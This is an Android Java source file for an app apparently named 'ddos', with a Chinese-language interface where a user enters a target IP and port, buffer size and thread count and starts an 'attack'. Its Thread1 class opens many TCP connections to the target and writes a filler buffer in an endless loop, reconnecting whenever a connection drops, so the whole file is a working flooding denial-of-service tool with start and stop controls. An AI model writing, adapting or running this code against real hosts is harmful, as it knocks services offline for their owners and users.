package com.greyCloud.ddos;


import android.app.AlertDialog;
import android.app.ProgressDialog;
import android.content.DialogInterface;
import android.os.Bundle;
import android.os.Handler;
import android.support.annotation.Nullable;
import android.support.v4.app.Fragment;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;

import java.io.DataOutputStream;
import java.io.OutputStream;
import java.net.Socket;

public class PageFragment extends Fragment {

    public static byte[] buffer;
    ProgressDialog pd;
    public static String ipS;
    public static int port;
    public static long killN=0;
    boolean lock=false;
    Handler uiHandler = new Handler();
    AlertDialog dialog;
    Thread1[] threadPool=null;
    public static long h=0;
    boolean stop=true;
    public static int buffSize=0;
    public static int tN=0;
    String err="";
    int jd=0;
    ProgressDialog pd1;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
    }

    @Override
    public void onActivityCreated(Bundle a) {
        super.onActivityCreated(a);
        Button btn1 = (Button) getView().findViewById(R.id.button1);
        Button btn2 = (Button) getView().findViewById(R.id.button2);
        //监听button事件
        pd = new ProgressDialog(getActivity());
        pd1 = new ProgressDialog(getActivity());
        dialog = new AlertDialog.Builder(getActivity()).setNegativeButton("确定", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                dialog.dismiss();
            }
        }).create();
        btn2.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (!lock) {
                    dialog.setTitle("警告");
                    dialog.setMessage("当前没有在执行攻击");
                    dialog.show();
                    return;
                }
                pd1.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);// 设置水平进度条
                pd1.setCancelable(false);// 设置是否可以通过点击Back键取消
                pd1.setCanceledOnTouchOutside(false);// 设置在点击Dialog外是否取消Dialog进度条
                //dialog.setIcon(R.drawable.ic_launcher);// 设置提示的title的图标，默认是没有的
                pd1.setTitle("正在终止...");
                pd1.setMax(threadPool.length);
                pd1.setMessage("等待线程退出...");
                pd1.show();
                stop s = new stop(threadPool.length);
                s.start();
                lock = false;
                stop = false;
            }

            class stop extends Thread {
                int l = 0;

                public stop(int l) {
                    this.l = l;
                }

                @Override
                public void run() {
                    for (int i = 0; i < l; i++) {
                        try {
                            threadPool[i].s.close();
                        } catch (Exception e) {
                        }
                        threadPool[i].interrupt();
                        jd = i;
                        Runnable runnable = new Runnable() {
                            @Override
                            public void run() {
                                //pd1.setMessage(String.valueOf(jd));
                                pd1.incrementProgressBy(jd);
                            }
                        };
                        uiHandler.post(runnable);
                    }
                    Runnable runnable = new Runnable() {
                        @Override
                        public void run() {
                            pd1.cancel();
                            killN = 0;
                            h = 0;
                            jd = 0;
                            ((LinearLayout) getView().findViewById(R.id.ll)).setVisibility(View.GONE);
                        }
                    };
                    uiHandler.post(runnable);
                }
            }
        });
        btn1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (lock) {
                    dialog.setTitle("警告");
                    dialog.setMessage("当前攻击正在执行");
                    dialog.show();
                    return;
                }
                pd.setProgressStyle(ProgressDialog.STYLE_SPINNER);
                pd.setCanceledOnTouchOutside(false);
                pd.setMessage("初始化...");
                pd.show();
                lock = true;
                LinearLayout ll;
                EditText ip = null;
                EditText thread = null;
                EditText buff = null;
                TextView kill;
                boolean astop = false;
                try {
                    ll = (LinearLayout) getView().findViewById(R.id.ll);
                    kill = (TextView) getView().findViewById(R.id.killThread);
                    ip = (EditText) getView().findViewById(R.id.ip);
                    buff = (EditText) getView().findViewById(R.id.buff);
                    thread = (EditText) getView().findViewById(R.id.thread);
                    kill.setText("正在攻击，线程死亡速度:0个/s\n存活线程:0");
                } catch (Exception e) {
                    pd.cancel();
                    dialog.setTitle("错误");
                    dialog.setMessage("初始化失败：" + e.getMessage());
                    dialog.show();
                    astop = true;
                }
                if (astop) {
                    lock = false;
                    return;
                }
                String[] temp = ip.getText().toString().split(":");
                if (temp.length != 2) {
                    pd.cancel();
                    dialog.setTitle("错误");
                    dialog.setMessage("ip格式错误");
                    dialog.show();
                    astop = true;
                }
                if (astop) {
                    lock = false;
                    return;
                }
                ipS = temp[0];
                try {
                    buffSize = Integer.parseInt(buff.getText().toString());
                } catch (Exception e) {
                    pd.cancel();
                    dialog.setTitle("错误");
                    dialog.setMessage("缓冲大小错误");
                    dialog.show();
                    astop = true;
                }
                if (astop) {
                    lock = false;
                    return;
                }
                port = Integer.parseInt(temp[1]);
                tN = Integer.parseInt(thread.getText().toString());
                Thread2 t = new Thread2();
                t.start();
            }

            class Thread2 extends Thread {
                @Override
                public void run() {
                    try {
                        buffer = new byte[1024 * buffSize];
                        for (int i = 0; i < 1024 * buffSize; i++) {
                            buffer[i] = 127;
                        }
                    } catch (Exception e) {
                        err = e.getMessage();
                        Runnable runnable = new Runnable() {
                            @Override
                            public void run() {
                                pd.cancel();
                                dialog.setTitle("错误");
                                dialog.setMessage("创建缓冲区时发生错误：" + err);
                                dialog.show();
                            }
                        };
                        uiHandler.post(runnable);
                        return;
                    }
                    Runnable runnable = new Runnable() {
                        @Override
                        public void run() {
                            pd.setMessage("正在释放线程...");
                        }
                    };
                    uiHandler.post(runnable);
                    try {
                        threadPool = new Thread1[tN];
                        for (int i = 0; i < tN; i++) {
                            //Runnable thread1 = new Thread1();
                            Thread1 thread2 = new Thread1();
                            threadPool[i] = thread2;
                            threadPool[i].start();
                        }
                    } catch (Exception e) {
                        err = e.getMessage();
                        Runnable runnable2 = new Runnable() {
                            @Override
                            public void run() {
                                pd.cancel();
                                dialog.setTitle("错误");
                                dialog.setMessage("释放线程时发生错误：" + err);
                                dialog.show();
                            }
                        };
                        uiHandler.post(runnable2);
                        return;
                    }
                    th t = new th();
                    t.start();
                    Runnable runnable1 = new Runnable() {
                        @Override
                        public void run() {
                            pd.cancel();
                            ((LinearLayout) getView().findViewById(R.id.ll)).setVisibility(View.VISIBLE);
                        }
                    };
                    uiHandler.post(runnable1);
                }
            }

            class th extends Thread {
                @Override
                public void run() {
                    while (true) {
                        if (!lock) {
                            break;
                        }
                        try {
                            Thread.sleep(1000);
                        } catch (Exception e) {

                        }
                        Runnable runnable = new Runnable() {
                            @Override
                            public void run() {
                                TextView kill = (TextView) getView().findViewById(R.id.killThread);
                                kill.setText("正在攻击，线程死亡速度:" + killN + "个/s\n存活线程:" + h);
                                killN = 0;
                            }
                        };
                        uiHandler.post(runnable);
                    }
                }
            }
        });
    }

    @Nullable
    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
        //View view = inflater.inflate(R.layout.fragment_welcome, container, false);
        //TextView textView = (TextView) view;
        //textView.setText("Fragment #" + mPage);

        View view=inflater.inflate(R.layout.fragment_ddos, container, false);;
        return view;
    }

}
class Thread1 extends Thread{
    public Socket s=null;
    @Override
    public void run(){
        OutputStream os=null;
        DataOutputStream dos=null;
        while(!isInterrupted()){
            try {
                s=new Socket(PageFragment.ipS,PageFragment.port);
                PageFragment.h++;
                //流准备
                //s.setSoTimeout(
                os=s.getOutputStream();
                dos=new DataOutputStream(os);
                while(!isInterrupted()) {
                    dos.write(PageFragment.buffer);
                    dos.flush();
                }
            }catch(Exception e) {
                //PageFragment.kill.setText("正在攻击，当前已死亡线程:"+PageFragment.killN);
                ///uiHandler.post(runnable1);
                //System.out.println("线程死亡，重生！"+e.getMessage());
                //Runnable thread1 = new Thread1(); 
            }
            PageFragment.killN++;
            PageFragment.h--;
        }
    }
}
